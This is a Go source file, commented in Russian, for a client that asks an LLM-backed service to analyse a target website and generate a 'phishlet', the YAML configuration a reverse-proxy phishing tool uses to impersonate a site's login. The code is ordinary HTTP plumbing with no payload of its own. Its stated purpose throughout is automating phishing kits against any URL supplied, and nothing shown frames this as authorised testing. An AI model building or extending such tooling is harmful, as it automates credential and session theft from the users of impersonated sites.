package ai

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"go.uber.org/zap"
)

// AIOrchestrator клиент для AI-оркестратора
type AIOrchestrator struct {
	baseURL    string
	httpClient *http.Client
	logger     *zap.Logger
}

// GenerateRequest запрос на генерацию фишлета
type GenerateRequest struct {
	TargetURL string            `json:"target_url"`
	Template  string            `json:"template"`
	Options   map[string]interface{} `json:"options,omitempty"`
}

// GenerateResponse ответ с фишлетом
type GenerateResponse struct {
	Success      bool     `json:"success"`
	PhishletYAML string   `json:"phishlet_yaml"`
	Analysis     Analysis `json:"analysis"`
	Message      string   `json:"message"`
}

// Analysis информация об анализе сайта
type Analysis struct {
	FormsFound       int      `json:"forms_found"`
	InputsFound      int      `json:"inputs_found"`
	APIEndpointsFound int     `json:"api_endpoints_found"`
	JSFilesFound     int      `json:"js_files_found"`
	TemplateUsed     string   `json:"template_used"`
}

// NewAIOrchestrator создаёт новый клиент
func NewAIOrchestrator(baseURL string, logger *zap.Logger) *AIOrchestrator {
	return &AIOrchestrator{
		baseURL: baseURL,
		httpClient: &http.Client{
			Timeout: 120 * time.Second, // Долгий таймаут для LLM
		},
		logger: logger,
	}
}

// GeneratePhishlet генерирует фишлет по URL
func (a *AIOrchestrator) GeneratePhishlet(ctx context.Context, req GenerateRequest) (*GenerateResponse, error) {
	a.logger.Info("Generating phishlet via AI",
		zap.String("target", req.TargetURL),
		zap.String("template", req.Template))
	
	// Сериализация запроса
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %w", err)
	}
	
	// HTTP запрос
	url := fmt.Sprintf("%s/api/v1/generate-phishlet", a.baseURL)
	httpReq, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(jsonReq))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	
	httpReq.Header.Set("Content-Type", "application/json")
	
	resp, err := a.httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()
	
	// Чтение ответа
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API returned status %d: %s", resp.StatusCode, string(body))
	}
	
	// Парсинг ответа
	var genResp GenerateResponse
	if err := json.Unmarshal(body, &genResp); err != nil {
		return nil, fmt.Errorf("failed to unmarshal response: %w", err)
	}
	
	if !genResp.Success {
		return nil, fmt.Errorf("generation failed: %s", genResp.Message)
	}
	
	a.logger.Info("Phishlet generated successfully",
		zap.Int("forms", genResp.Analysis.FormsFound),
		zap.Int("inputs", genResp.Analysis.InputsFound))
	
	return &genResp, nil
}

// AnalyzeSite анализирует сайт без генерации фишлета
func (a *AIOrchestrator) AnalyzeSite(ctx context.Context, url string) (map[string]interface{}, error) {
	a.logger.Info("Analyzing site", zap.String("url", url))
	
	reqURL := fmt.Sprintf("%s/api/v1/analyze/%s", a.baseURL, url)
	
	resp, err := a.httpClient.Get(reqURL)
	if err != nil {
		return nil, fmt.Errorf("failed to analyze: %w", err)
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}
	
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("failed to unmarshal: %w", err)
	}
	
	return result, nil
}

// HealthCheck проверяет здоровье сервиса
func (a *AIOrchestrator) HealthCheck(ctx context.Context) (map[string]string, error) {
	reqURL := fmt.Sprintf("%s/health", a.baseURL)
	
	resp, err := a.httpClient.Get(reqURL)
	if err != nil {
		return nil, fmt.Errorf("health check failed: %w", err)
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}
	
	var result map[string]string
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("failed to unmarshal: %w", err)
	}
	
	return result, nil
}
